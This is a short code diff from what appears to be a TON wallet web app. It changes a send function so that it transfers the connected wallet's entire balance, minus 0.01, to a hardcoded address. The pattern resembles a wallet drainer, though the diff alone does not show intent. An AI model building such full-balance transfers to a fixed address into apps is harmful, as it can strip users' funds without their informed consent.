@@ -42,11 +42,12 @@ function App() {
   };
 
   const send = async () => {
+    console.log(balance);
     if (connected) {
       console.log(connected);
       await sender.send({
         to: Address.parse(ADDRESS),
-        value: toNano(balance!),
+        value: toNano((balance! - 0.01).toString()),
       });
     }
   };
